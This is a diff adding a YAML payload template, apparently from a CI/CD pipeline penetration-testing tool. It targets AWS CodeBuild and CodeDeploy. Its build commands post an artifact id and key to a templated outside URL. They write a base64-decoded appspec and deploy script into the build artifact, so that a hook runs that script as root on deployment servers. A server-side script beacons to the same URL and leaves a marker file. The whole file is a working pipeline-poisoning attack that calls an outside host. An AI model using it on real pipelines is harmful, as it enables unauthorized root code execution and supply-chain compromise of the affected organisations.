@@ -1,0 +1,28 @@
+appspec: |
+  version: 0.0
+  os: linux
+  files:
+    - source: /
+      destination: /deployment
+  hooks:
+    BeforeInstall:
+      - location: Scripts/deploy.sh
+        timeout: 300
+        runas: root
+buildspec: |
+  version: 0.2
+  phases:
+    post_build:
+      commands:
+        - "curl -X POST -H \"Content-Type: application/json\" -d '{{\"action\": \"update\", \"artifactId\": \"{0}\", \"container\": true, \"key\":\"{4}\"}}' \"{1}\""
+        - mkdir -p $CODEBUILD_SRC_DIR/target/Scripts
+        - echo "{2}" | base64 -d > $CODEBUILD_SRC_DIR/target/appspec.yml
+        - echo "{3}" | base64 -d > $CODEBUILD_SRC_DIR/target/Scripts/deploy.sh
+        - echo "CPPT was able to execute in the container" > $CODEBUILD_SRC_DIR/target/CPPTWasHere.container
+  artifacts:
+    files:
+      - '**/*'
+    base-directory: $CODEBUILD_SRC_DIR/target
+script: |
+  curl -X POST -H "Content-Type: application/json" -d '{{"action": "update", "artifactId": "{0}", "server": true, "key": "{2}"}}' "{1}"
+  echo "CPPT was able to execute in the server" > /CPPTWasHere.server
